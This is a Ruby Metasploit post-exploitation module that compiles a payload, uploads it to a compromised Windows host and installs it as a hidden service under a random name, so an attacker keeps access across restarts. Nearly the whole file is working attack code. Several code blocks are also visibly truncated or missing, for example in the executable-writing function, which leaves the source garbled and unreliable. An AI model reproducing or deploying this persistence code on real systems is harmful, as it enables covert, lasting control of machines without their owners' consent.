# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require &#039;metasploit/framework/compiler/windows&#039;

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Windows::Priv

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039; => &#039;Windows Persistent Service Installer&#039;,
      &#039;Description&#039;   => %q{
        This Module will generate and upload an executable to a remote host, next will make it a persistent service.
        It will create a new service which will start the payload whenever the service is running. Admin or system
        privilege is required.
      },
      &#039;License&#039;       => MSF_LICENSE,
      &#039;Author&#039;        => [ &#039;Green-m <greenm.xxoo[at]gmail.com>&#039; ],
      &#039;Platform&#039;      => [ &#039;windows&#039; ],
      &#039;Targets&#039;       => [[&#039;Windows&#039;, {}]],
      &#039;DefaultTarget&#039;        => 0,
      &#039;References&#039;           => [
        [ &#039;URL&#039;, &#039;https://github.com/rapid7/metasploit-framework/blob/master/external/source/metsvc/src/metsvc.cpp&#039; ]
      ],
      &#039;DisclosureDate&#039;=> "Oct 20 2018"
    ))

    register_options(
      [
        OptInt.new(&#039;RETRY_TIME&#039;,   [false, &#039;The retry time that shell connect failed. 5 seconds as default.&#039;, 5 ]),
        OptString.new(&#039;REMOTE_EXE_PATH&#039;, [false, &#039;The remote victim exe path to run. Use temp directory as default. &#039;]),
        OptString.new(&#039;REMOTE_EXE_NAME&#039;, [false, &#039;The remote victim name. Random string as default.&#039;]),
        OptString.new(&#039;SERVICE_NAME&#039;,   [false, &#039;The name of service. Random string as default.&#039; ]),
        OptString.new(&#039;SERVICE_DESCRIPTION&#039;,   [false, &#039;The description of service. Random string as default.&#039; ])
     ])
  end

  # Run Method for when run command is issued
  #-------------------------------------------------------------------------------
  def exploit
    unless is_system? || is_admin?
      print_error("Insufficient privileges to create service")
      return
    end

      return
    end

    print_status("Running module against #{sysinfo[&#039;Computer&#039;]}")

    # Set variables
    rexepath              = datastore[&#039;REMOTE_EXE_PATH&#039;]
    @retry_time           = datastore[&#039;RETRY_TIME&#039;]
    rexename              = datastore[&#039;REMOTE_EXE_NAME&#039;]     || Rex::Text.rand_text_alpha(4..8)
    @service_name         = datastore[&#039;SERVICE_NAME&#039;]        || Rex::Text.rand_text_alpha(4..8)
    @service_description  = datastore[&#039;SERVICE_DESCRIPTION&#039;] || Rex::Text.rand_text_alpha(8..16)

    # Add the windows pe suffix to rexename
    unless rexename.end_with?(&#039;.exe&#039;)
      rexename << ".exe"
    end

    host, _port = session.tunnel_peer.split(&#039;:&#039;)
    @clean_up_rc = ""

    buf = create_payload
    vprint_status(buf)
    metsvc_code = metsvc_template(buf)
    bin = Metasploit::Framework::Compiler::Windows.compile_c(metsvc_code)

    victim_path = write_exe_to_target(bin, rexename, rexepath)
    install_service(victim_path)

    clean_rc = log_file
    file_local_write(clean_rc, @clean_up_rc)

    report_note(host: host,
        type: "host.persistance.cleanup",
        data: {
          local_id: session.sid,
          stype: session.type,
          desc: session.info,
          platform: session.platform,
          via_payload: session.via_payload,
          via_exploit: session.via_exploit,
          created_at: Time.now.utc,
          commands: @clean_up_rc
        })
  end

  def create_payload
    p = payload.encoded
    Msf::Simple::Buffer.transform(p, &#039;c&#039;, &#039;buf&#039;)
  end

  # Function for writing executable to target host
  # Code from post/windows/manage/persistence_exe
  #
  def write_exe_to_target(rexe, rexename, rexepath)
    # check if we have write permission
    if rexepath
      begin
        print_warning("Insufficient privileges to write in #{rexepath}, writing to %TEMP%")
      end

    # Write to %temp% directory if not set REMOTE_EXE_PATH
    else
    end


    @clean_up_rc << "execute -H -i -f taskkill.exe -a \"/f /im #{rexename}\"\n" # Use interact to wait until the task ended.

  end

    fd.write(rexe)
    fd.close
  end

  # Function for creating log folder and returning log path
  #-------------------------------------------------------------------------------
  def log_file
    # Get hostname
    host = session.sys.config.sysinfo["Computer"]

    # Create Filename info to be appended to downloaded files
    filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")

    # Create a directory for the logs
    logs = ::File.join(Msf::Config.log_directory, &#039;persistence&#039;, Rex::FileUtils.clean_path(host + filenameinfo))

    # Create the log directory
    ::FileUtils.mkdir_p(logs)

    logs + ::File::Separator + Rex::FileUtils.clean_path(host + filenameinfo) + ".rc"
  end

  # Function to install payload as a service
  #-------------------------------------------------------------------------------
  def install_service(path)
    print_status("Creating service #{@service_name}")

    begin
      session.sys.process.execute("cmd.exe /c \"#{path}\" #{@install_cmd}", nil, {&#039;Hidden&#039; => true})
    rescue ::Exception => e
      print_error("Failed to install the service.")
      print_error(e.to_s)
    end

    @clean_up_rc = "execute -H -f sc.exe -a \"delete #{@service_name}\"\n" + @clean_up_rc
    @clean_up_rc = "execute -H -f sc.exe -a \"stop #{@service_name}\"\n"   + @clean_up_rc
  end

  def metsvc_template(buf)
    @install_cmd = Rex::Text.rand_text_alpha(4..8)
    @start_cmd   = Rex::Text.rand_text_alpha(4..8)
    template = File.read(File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;persistence_service&#039;, &#039;service.erb&#039;))
    ERB.new(template).result(binding)
  end
end

